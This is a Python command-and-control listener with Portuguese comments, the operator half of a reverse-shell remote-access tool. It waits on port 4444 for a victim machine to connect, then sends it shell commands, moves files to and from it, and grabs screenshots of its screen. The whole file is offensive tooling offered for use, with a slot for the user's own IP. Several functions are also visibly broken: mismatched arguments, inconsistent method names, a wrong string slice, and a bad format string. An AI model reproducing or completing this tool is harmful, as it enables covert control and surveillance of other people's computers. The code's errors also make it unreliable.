import os
import subprocess
import socket
import termcolor
import json
from termcolor import colored

#funcao para nao fechar a shell
def dados_rec():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

#funcao recebimento dos dados em arquivo json
def envio_dados():
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

#funcao de upload de arquivos
def upload_file (file):
    f = open(file, 'rb')
    target.send(f.read())

#funcao de dowload de arquivos
def download_file (file):
    f = open(file, 'wb')
    target.setTimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.setTimeout(None)
    f.close

#funcao para o menu e comandos
def fun_foda ():
    count = 0
    while True:
        comando_foda = input(' * Shell~%$: ' % str(ip))
        envio_dados(comando_foda)
        if comando_foda == 'sair':
            break
        elif comando_foda == 'clear':
            os.system('clear')
        elif comando_foda [:3] == 'cd ':
            pass
        elif comando_foda [:6] == 'upload':
            upload_file(comando_foda[:7])
        elif comando_foda [:8] == 'download':
            download_file (comando_foda[9:])
        elif comando_foda [:10] == 'screenshot':
            f = open('screenshot%d' %(count), 'wb')
            target.settimeout(5)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif comando_foda == 'Ajuda':
            print (colored ('''\n 
            Sair: Encerrar a conexao com o alvo.
            clear: Limpa o texto no terminal.
            cd + "DirectoryName": Mudar o diretorio na maquina alvo.
            upload + "FileName": Enviar arquivos para o alvo.
            download + "FileName": Baixar um arquivo para o alvo.
            screenshot: Tira uma screenshot da tela do alvo.
            Ajuda: Ajuda com os comandos da C2.
            '''), 'red')
        else:
            resposta = dados_rec()
            print (resposta)



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#incluir o seu IP/ e a porta que deseja se conectar
sock.bind(('SEU IP', 4444))
print (colored('Esperando por conexões: ', 'green'))
sock.listen(5)

target, ip = sock.accept()
print(colored('+ Conectado com: ' + str(ip), 'yellow'))
fun_foda()
